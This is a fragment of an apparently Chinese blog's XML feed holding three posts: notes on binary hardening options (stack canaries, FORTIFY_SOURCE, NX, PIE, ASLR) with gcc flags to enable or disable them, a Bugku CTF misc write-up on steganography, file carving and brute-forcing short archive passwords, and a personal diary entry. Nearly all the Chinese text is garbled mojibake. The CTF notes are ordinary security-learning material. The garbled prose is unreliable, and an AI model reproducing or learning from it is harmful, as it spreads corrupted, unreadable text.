ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚**</p><p>gccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚</p><p>å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;ç¦ç”¨æ ˆä¿æŠ¤</span><br><span class="line">gcc -fstack-protector -o test test.c   &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br></pre></td></tr></table></figure><h1 id="FORTIFY-è½»å¾®çš„æ£€æŸ¥"><a href="#FORTIFY-è½»å¾®çš„æ£€æŸ¥" class="headerlink" title="FORTIFY(è½»å¾®çš„æ£€æŸ¥)"></a>FORTIFY(è½»å¾®çš„æ£€æŸ¥)</h1><p>forityå…¶å®æ˜¯éå¸¸è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ã€‚é€‚ç”¨æƒ…å½¢æ˜¯ç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintfï¼Œ vsprintfï¼Œvsnprintf, getsä»¥åŠå®½å­—ç¬¦çš„å˜ä½“ã€‚FORTIFY_ SOURCEè®¾ä¸º1,å¹¶ä¸”å°†ç¼–è¯‘å™¨è®¾ç½®ä¸ºä¼˜åŒ–1(gcc -01)ï¼Œä»¥åŠå‡ºç°ä¸Šè¿°æƒ…å½¢ï¼Œé‚£ä¹ˆç¨‹åºç¼–è¯‘æ—¶å°±ä¼šè¿›è¡Œæ£€æŸ¥ä½†åˆä¸ä¼šæ”¹å˜ç¨‹åºåŠŸèƒ½ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ä¼šå¼€è¿™ä¸ªæ£€æŸ¥ </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; è¾ƒå¼±çš„æ£€æŸ¥ </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 ä»…ä»…åªä¼šåœ¨ç¼–è¯‘æ—¶è¿›â¾æ£€æŸ¥ (ç‰¹åˆ«åƒæŸäº›å¤´â½‚ä»¶ #include &lt;str _FORTIFY_SOURCEè®¾ä¸º1ï¼Œå¹¶ä¸”å°†ç¼–è¯‘å™¨è®¾ç½®ä¸ºä¼˜åŒ–1(gcc -O1)ï¼Œä»¥åŠå‡ºç°ä¸Šè¿°æƒ…å½¢ï¼Œé‚£ä¹ˆç¨‹åºç¼– </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; è¾ƒå¼ºçš„æ£€æŸ¥ gcc -D_FORTIFY_SOURCE&#x3D;2 ç¨‹åºæ‰§â¾æ—¶ä¹Ÿä¼šæœ‰æ£€æŸ¥ (å¦‚æœæ£€æŸ¥åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œå°±ç»ˆâ½Œç¨‹åº) _FORTIFY_SOURCEè®¾ä¸º2ï¼Œæœ‰äº›æ£€æŸ¥åŠŸèƒ½ä¼šåŠ â¼Šï¼Œä½†æ˜¯è¿™å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒã€‚</span><br></pre></td></tr></table></figure><h1 id="NXï¼ˆDEPï¼‰"><a href="#NXï¼ˆDEPï¼‰" class="headerlink" title="NXï¼ˆDEPï¼‰"></a>NXï¼ˆDEPï¼‰</h1><p>NXï¼ˆ DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜â»šæ ‡è¯†ä¸ºä¸å¯æ‰§â¾,å½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬â¼Šshellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®â»šâ¾¯ä¸Šæ‰§â¾æŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ ,â½½ä¸æ˜¯å»æ‰§â¾æ¶æ„æŒ‡ä»¤ ã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; ç¦â½¤NXä¿æŠ¤ </span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; å¼€å¯NXä¿æŠ¤</span><br></pre></td></tr></table></figure><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰,æ•°æ®æ‰§â¾ä¿æŠ¤( D E P ) ï¼ˆ Data Execution Prevention ï¼‰ æ˜¯â¼€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œèƒ½ å¤Ÿ åœ¨ å†… å­˜ä¸Šæ‰§â¾é¢å¤–æ£€æŸ¥ä»¥å¸®åŠ©é˜²â½Œåœ¨ç³»ç»Ÿä¸Šè¿â¾æ¶æ„ä»£ç  ,åœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p><h1 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h1><p>å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚PIEå’ŒASLRä¸æ˜¯ä¸€æ ·çš„ä½œç”¨ï¼ŒASLRåªèƒ½å¯¹å †ã€æ ˆ,ibcå’ŒmmapéšæœºåŒ–ï¼Œè€Œä¸èƒ½å¯¹ä»£ç æ®µï¼Œæ•°æ®æ®µéšæœºåŒ–ï¼Œä½¿ç”¨PIE+ASLRåˆ™å¯ä»¥å¯¹ä»£ç æ®µå’Œæ•°æ®æ®µéšæœºåŒ–ã€‚åŒºåˆ«æ˜¯ASLRæ˜¯ç³»ç»ŸåŠŸèƒ½é€‰é¡¹ï¼ŒPIEå’ŒPICæ˜¯ç¼–è¯‘å™¨åŠŸèƒ½é€‰é¡¹ã€‚è”ç³»ç‚¹åœ¨äºåœ¨å¼€å¯ASLRä¹‹åï¼ŒPIEæ‰ä¼šç”Ÿæ•ˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE </span><br><span class="line">gcc -fpie -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1 </span><br><span class="line">gcc -fPIE -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€â¾¼å¼ºåº¦2 </span><br><span class="line">gcc -fpic -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE</span><br><span class="line">gcc -fPIC -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€â¾¼å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE</span><br></pre></td></tr></table></figure><h1 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR (Address Space Layout Randomization)"></a>ASLR (Address Space Layout Randomization)</h1><p>ASLRæ˜¯â¼€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯,é€šè¿‡å¯¹å †æ ˆ ã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹â½¬çš„åœ°å€çš„éš¾åº¦,é˜²â½Œæ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®,è¾¾åˆ°é˜»â½Œæº¢å‡ºæ”»å‡»çš„â½¬çš„ã€‚ </p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugkuMISC</title>
      <link href="/post/Bugku-MISC.html"/>
      <url>/post/Bugku-MISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="BUGKU-miscéƒ¨åˆ†"><a href="#BUGKU-miscéƒ¨åˆ†" class="headerlink" title="BUGKU miscéƒ¨åˆ†"></a>BUGKU miscéƒ¨åˆ†</h1><h2 id="1-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡"><a href="#1-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡" class="headerlink" title="1 è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡"></a>1 è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡</h2><p>å…ˆçœ‹äº†ä¸€ä¸‹å±æ€§ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰“å¼€å°±æ˜¯ä¸Šé¢é‚£å¼ å›¾ï¼Œæ²¡æœ‰ä¸Šé¢å¼‚æ ·ï¼Œ</p><img src="/images/21.png" height="500" width="600" /><p>ç›´æ¥ä¸¢winhexï¼Œæ‹–è‡³æœ€åº•ï¼Œå‘ç°æ˜¯unicodeåŠ å¯†</p><img src="/images/22.png" height="500" width="600" /><p>å‘ç°æ˜¯unicodeåŠ å¯†ï¼Œç›´æ¥è§£ç æˆASCIIï¼Œå¾—åˆ°flag</p><img src="/images/23.png" height="500" width="600" /><hr><h2 id="2-éšå†™"><a href="#2-éšå†™" class="headerlink" title="2 éšå†™"></a>2 éšå†™</h2><p>çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“æ˜¯å›¾ç‰‡éšå†™ï¼Œå¯¹å›¾ç‰‡è¿›è¡Œæ ¡éªŒå’Œï¼Œå‘ç°ç»“æœæœ‰é—®é¢˜ï¼Œè¯´æ˜ç…§ç‰‡é«˜åº¦è¢«ä¿®æ”¹äº†</p><img src="/images/24.png" height="500" width="600" /><p>ä¿®æ”¹é«˜åº¦å¾—åˆ°flag</p><img src="/images/25.png" height="400" width="300" /><hr><h2 id="3-telnet"><a href="#3-telnet" class="headerlink" title="3 telnet"></a>3 telnet</h2><p>ä¸‹è½½é™„ä»¶åæ‰“å¼€ï¼Œç›´æ¥è¿½è¸ªTCPæµå°±å¾—åˆ°äº†flag</p><img src="/images/26.png" height="500" width="600" /><hr><h2 id="4-çœ¼è§éå®"><a href="#4-çœ¼è§éå®" class="headerlink" title="4 çœ¼è§éå®"></a>4 çœ¼è§éå®</h2><p>æ‰“å¼€åå‘ç°æ–‡ä»¶æ˜¯æŸåçš„è€Œä¸”å‡ºç°äº†PKå­—ç¬¦ï¼ŒçŒœæµ‹é‡Œé¢è—æœ‰å‹ç¼©åŒ…ï¼Œäºæ˜¯æ”¹æˆå‹ç¼©åŒ…å½¢å¼æ‰“å¼€</p><img src="/images/27.png" height="500" width="600" /><p>åœ¨wordé‡Œé¢çš„document.xmlé‡Œé¢å‘ç°äº†flag</p><img src="/images/28.png" height="500" width="600" /><hr><h2 id="5-å•Šå“’"><a href="#5-å•Šå“’" class="headerlink" title="5 å•Šå“’"></a>5 å•Šå“’</h2><p>è€è§„çŸ©ï¼Œæ‰“å¼€ç…§ç‰‡çœ‹å±æ€§ï¼Œå‘ç°ç…§ç›¸æœºå‹å·æœ‰ä¸œè¥¿ï¼Œä¹‹ååº”è¯¥ç”¨å¾—ä¸Š</p><img src="/images/29.png" height="600" width="600" /><p>ç”¨binwalkæŸ¥çœ‹ï¼Œå‘ç°é‡Œé¢è—æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç”¨foremostè¿›è¡Œåˆ†ç¦»å¾—åˆ°å‹ç¼©åŒ…ï¼Œæ‰“å¼€å‘ç°æ˜¯åŠ å¯†çš„ï¼Œå°è¯•äº†ç…§ç›¸æœºå‹å·ï¼Œå‘ç°å¯†ç é”™è¯¯ï¼Œåˆ†æäº†ä¸€ä¸‹é‚£ä¸²ç…§ç›¸æœºå‹å·ï¼Œå‘ç°æ˜¯åå…­è¿›åˆ¶ï¼Œä¹‹åè§£ç å¾—åˆ°å¯†ç </p><img src="/images/30.png" height="600" width="600" /><p>æ‰“å¼€å¾—åˆ°flag</p><img src="/images/31.png" height="600" width="600" /><hr><h2 id="6-ping"><a href="#6-ping" class="headerlink" title="6 ping"></a>6 ping</h2><p>ç”¨wiresharkæ‰“å¼€åå‘ç°åå…­è¿›åˆ¶æ—è¾¹ä¸€ä¸ªfï¼Œæ‰“å¼€å…¶å®ƒçš„å‘ç°ç»„åˆèµ·æ¥æ˜¯flag</p><img src="/images/32.png" height="600" width="500" /><hr><h2 id="7-èµ›åšæœ‹å…‹"><a href="#7-èµ›åšæœ‹å…‹" class="headerlink" title="7 èµ›åšæœ‹å…‹"></a>7 èµ›åšæœ‹å…‹</h2><p>æ‰“å¼€åå‘ç°å°±ä¸€ä¸ªå…‰ç§ƒç§ƒçš„åŠ å¯†æ–‡ä»¶ï¼Œä¸ç”¨çŒœéƒ½çŸ¥é“æ˜¯ä¼ªåŠ å¯†ï¼Œä¸¢è¿›winhexä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥æ‰“å¼€äº†</p><img src="/images/33.png" height="600" width="500" /><p>æ‰“å¼€æ–‡ä»¶åå‘ç°æ˜¯ä¸€å †ä¹±ç ï¼Œä¸¢è¿›winhexå‘ç°æ˜¯pngæ ¼å¼ç…§ç‰‡</p><img src="/images/34.png" height="600" width="400" /><p>ä¿®æ”¹ä¸€ä¸‹åç¼€åå›¾ç‰‡å°±å‡ºæ¥äº†ï¼Œä¸è¿‡å¥½åƒflagè¿˜æ²¡å‡ºæ¥ï¼Œå±æ€§é‡Œé¢ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ ¡éªŒå’Œä¹Ÿæ­£ç¡®ï¼Œbinwalkä¹Ÿæ²¡æŸ¥å‡ºé—®é¢˜</p><img src="/images/35.png" height="600" width="400" /><img src="/images/36.png" height="400" width="600" /><p>æœ€åæ¨æµ‹ä¸€ä¸ªæ˜¯lsbéšå†™ï¼Œæœä¸å…¶ç„¶ï¼Œå¾—åˆ°flag</p><img src="/images/37.png" height="500" width="600" /><hr><h2 id="8-è´æ–¯æ‰‹"><a href="#8-è´æ–¯æ‰‹" class="headerlink" title="8 è´æ–¯æ‰‹"></a>8 è´æ–¯æ‰‹</h2><p>æ‰“å¼€ä»‹ç»å‘ç°æ˜¯å¯¹å›¾ç‰‡ä¸Šäººç‰©ä»‹ç»ï¼Œåˆšæƒ³å…³é—­å‘ç°æœ€ä¸‹é¢è¿˜æœ‰ä¸œè¥¿ï¼Œå‘ç°å¯†ç æ˜¯å››ä½æ•°å’Œè¿™ä¸ªè´æ–¯æ‰‹æœ‰å…³</p><img src="/images/38.png" height="500" width="600" /><p>æ‡’å¾—æœç›´æ¥æš´åŠ›ç ´è§£</p><img src="/images/39.png" height="500" width="600" /><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œ5+58åº”è¯¥åŠ å¯†æ–¹å¼MD5å’Œbase58</p><img src="/images/40.png" height="500" width="600" /><p>è§£ç å¾—åˆ°flag</p><img src="/images/41.png" height="500" width="500" /><img src="/images/42.png" height="500" width="600" /><hr><h2 id="9-åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—"><a href="#9-åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—" class="headerlink" title="9 åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—"></a>9 åˆä¸€å¼ å›¾ç‰‡ï¼Œè¿˜å•çº¯å—</h2><p>æ‰“å¼€å±æ€§å‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸¢è¿›winhexé‡Œé¢ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆï¼Œç”¨binwalkæŸ¥çœ‹å‘ç°ç…§ç‰‡é‡Œé¢æœ‰å…¶å®ƒjpgç…§ç‰‡ï¼Œç”¨foremåˆ†ç¦»</p><img src="/images/43.png" height="500" width="600" /><p>å‘ç°å›¾ç‰‡é‡Œé¢æœ‰flagï¼ˆä¸è¿‡è¿™ä¸ªflagæœ‰ç‚¹é•¿ï¼Œæœ‰ç‚¹ç¦»è°±ï¼‰</p><img src="/images/44.png" height="500" width="600" /><hr><h2 id="10-çŒœ"><a href="#10-çŒœ" class="headerlink" title="10 çŒœ"></a>10 çŒœ</h2><p>ç­¾åˆ°é¢˜ï¼Œç™¾åº¦è¯†å›¾ï¼Œå‘ç°æ˜¯åˆ˜äº¦è²ï¼Œå¾—åˆ°flagï¼ˆæ³¨æ„flagæ ¼å¼ï¼‰</p><hr><h2 id="11-å®½å¸¦ä¿¡æ¯æ³„éœ²"><a href="#11-å®½å¸¦ä¿¡æ¯æ³„éœ²" class="headerlink" title="11 å®½å¸¦ä¿¡æ¯æ³„éœ²"></a>11 å®½å¸¦ä¿¡æ¯æ³„éœ²</h2><p>ä¸‹è½½RouterPassViewï¼Œç”¨è¿™ä¸ªæœç´¢usernameï¼ˆç”¨æˆ·åï¼‰</p><img src="/images/53.png" height="500" width="600" /><hr><h2 id="12-éšå†™2"><a href="#12-éšå†™2" class="headerlink" title="12 éšå†™2"></a>12 éšå†™2</h2><p>ç›´æ¥ä¸¢è¿›winhexï¼Œå‘ç°jpgå›¾ç‰‡ç»“å°¾åé¢æœ‰å‹ç¼©åŒ…çš„å­—ç¬¦</p><img src="/images/45.png" height="500" width="600" /><p>ç”¨foremoståˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„æ–‡ä»¶å’Œå¯†ç æç¤ºï¼Œè§£å¯†ï¼ˆç›´æ¥çˆ†ç ´ï¼Œåæ­£æ˜¯ä¸‰ä½æ•°ï¼‰å¾—åˆ°ä¸€å¼ å›¾ç‰‡</p><img src="/images/46.png" height="500" width="600" /><p>è€è§„çŸ©ä¸¢winhexï¼Œå‘ç°æœ€åæœ‰flag</p><img src="/images/47.png" height="500" width="600" /><hr><h2 id="13-å¤šç§æ–¹æ³•è§£å†³"><a href="#13-å¤šç§æ–¹æ³•è§£å†³" class="headerlink" title="13 å¤šç§æ–¹æ³•è§£å†³"></a>13 å¤šç§æ–¹æ³•è§£å†³</h2><p>è¿™é“é¢˜æç¤ºè¯´æœ‰äºŒç»´ç ï¼Œæ‰“å¼€é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªexeå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå°è¯•æ‰“å¼€å‘ç°æ— æ³•è¿è¡Œï¼‰ï¼Œç›´æ¥ä¸¢winhex</p><img src="/images/48.png" height="500" width="600" /><p>å‘ç°æ˜¯æ—è¾¹æ˜¯åŠ å¯†çš„å›¾ç‰‡ç¼–ç ï¼Œç›´æ¥åœ¨çº¿è§£ç å¾—åˆ°flag</p><img src="/images/49.png" height="500" width="600" /><hr><h2 id="14-é—ªçš„å¥½å¿«"><a href="#14-é—ªçš„å¥½å¿«" class="headerlink" title="14 é—ªçš„å¥½å¿«"></a>14 é—ªçš„å¥½å¿«</h2><p>emmmmï¼Œè¿™é“é¢˜æŒºç®€å•çš„å°±æ˜¯å¥½çƒ¦ï¼Œç”¨Stegsolve.jarä¸€å¸§ä¸€å¸§çœ‹ï¼Œæ‰«ç ï¼Œflagå°±å‡ºæ¥äº†</p><hr><h2 id="15-come-game"><a href="#15-come-game" class="headerlink" title="15 come_game"></a>15 come_game</h2><p>æ‰“å¼€åæ˜¯ä¸ªæ¸¸æˆï¼Œæ¯æ¬¡æ­»äº¡éƒ½ä¼šå¤šä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°save1å°†å®ƒä¸¢å°½winhexé‡Œé¢ï¼Œå°†2ACæ”¹æˆ5ACåœ¨è¿›æ¸¸æˆå°±å¯ä»¥å¾—åˆ°flagï¼Œå½“ç„¶å¦‚æœè§‰å¾—èƒ½é—¯è¿‡å»ä¹Ÿåº”è¯¥èƒ½å¾—åˆ°flagã€‚ï¼ˆæˆ‘æ²¡è¯•è¿‡ï¼Œä¸ç¡®å®šèƒ½ä¸èƒ½è¡Œï¼Œæé†’ä¸€ä¸‹è¿™ä¸ªæ¸¸æˆæ‰“å¼€äº†å¥½åƒä¸èƒ½å…³é—­ï¼‰</p><img src="/images/50.png" height="500" width="600" /><hr><h2 id="16-ç™½å“¥çš„é¸½å­"><a href="#16-ç™½å“¥çš„é¸½å­" class="headerlink" title="16 ç™½å“¥çš„é¸½å­"></a>16 ç™½å“¥çš„é¸½å­</h2><p>ç›´æ¥ä¸¢è¿›winhexé‡Œé¢ï¼Œå‘ç°ç…§ç‰‡ç»“å°¾åé¢å¤šå‡ºä¸€äº›å­—ç¬¦ï¼Œåˆ†æä¸€ä¸‹å°±çŸ¥é“æ˜¯æ …æ åŠ å¯†</p><img src="/images/51.png" height="500" width="600" /><p>è§£å¯†ï¼ˆå¯†åŒ™æˆ‘æ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•çš„ï¼Œä¸è¿‡è¿˜å¥½å°±æ˜¯3ï¼Œåé¢æ‰çŸ¥é“é‚£ä¸ªæç¤ºâ€œå’•å’•å’•â€å¥½åƒå°±ä»£è¡¨key=3ï¼‰</p><img src="/images/52.png" height="500" width="600" /><h2 id="17-linux"><a href="#17-linux" class="headerlink" title="17 linux"></a>17 linux</h2><p>çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“è¦ç”¨Linuxç³»ç»Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¿«ä¹å‘¨äº”</title>
      <link href="/post/tuoli.html"/>
      <url>/post/tuoli.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>è¿™æ˜¯è¿™å‡ ä¸ªæœˆæœ€å€¼å¾—çºªå¿µçš„å‘¨äº”ï¼Œä½“éªŒäº†è„±ç¦»å­¦æ ¡çš„å¿«ä¹</p></blockquote><p>2020.12.13</p><p>  æ™šä¸Šå’Œç¤¾å›¢å…¶å®ƒäººä¸€èµ·è°‹åˆ’ç€â€œå‡ºæ ¡å¤§è®¡â€ï¼ŒåŸæœ¬å®šåœ¨å‘¨å…­ï¼Œä½†æ˜¯ç”±äºå­¦æ ¡è¦ä½“æµ‹ï¼ˆæŒºä½©æœå­¦æ ¡æŒ‘æ—¶é—´çš„èƒ½åŠ›ğŸ¤¬ï¼‰ï¼Œä¸å¾—ä¸å°†æ—¶é—´æ”¹æˆå‘¨äº”ï¼Œè®©å¿«ä¹å‡å°‘äº†ä¸€åŠğŸ˜”</p><p>2020.12.15</p><p>  æœç„¶åˆ°äº†å‘¨æœ«å°±ä¼šå‘ç°å±äº‹å¾ˆå¤šğŸ˜”ï¼Œä¸€ä¸ªä¸ªå‘¨æœ«éƒ½æœ‰äº‹ï¼Œåªå‰©å‡ ä¸ªå¤§ç”·äººå¯ä»¥å‡ºå»ï¼Œè¿™æ¬¡å‡ºæ ¡ä¹Ÿå˜æˆäº†â€œç½—æ±‰å‡ºè¡Œâ€ï¼Œç…§è¿™æ ·ä¸‹å»ï¼Œä¸çŸ¥é“ä¹‹åå‡ å¤©ä¼šå‘ç”Ÿä»€ä¹ˆğŸ˜±</p><p>2020.12.17</p><p>  åŸæœ¬è¯¾ä¸Šå¾—å¥½å¥½çš„ï¼Œçªç„¶ä¸€ä¸ªæœ‹å‹è¯´å‘¨å…­ä½“æµ‹å–æ¶ˆäº†ï¼Œæ”¹äº†æ—¶é—´ï¼Œæˆ‘ç›´æ¥å½“åœºçˆ†ç‚¸ğŸ¤¬ï¼Œæ²¡åŠæ³•å‡æ¡éƒ½ä¸Šäº¤äº†ï¼Œæ—¶é—´ä¹Ÿä¸èƒ½ä¿®æ”¹ï¼Œåªèƒ½è®¤å‘½</p><p>2020.12.18</p><p>  åŸæœ¬è®¡åˆ’å¥½çš„äº”ä¸ªäººï¼Œè¦èµ°çš„æ—¶å€™æœ€åä¸€ä¸ªäººæ‰é“¾å­ğŸ˜”ï¼Œæœ€åå˜æˆå››ç½—æ±‰å‡ºè¡Œã€‚</p><p>å¼€å§‹æ‰“ç®—çœ‹ç”µå½±ï¼Œä½†æ˜¯è§‰å¾—æ²¡ä»€ä¹ˆå¥½çœ‹çš„ç”µå½±åŠ 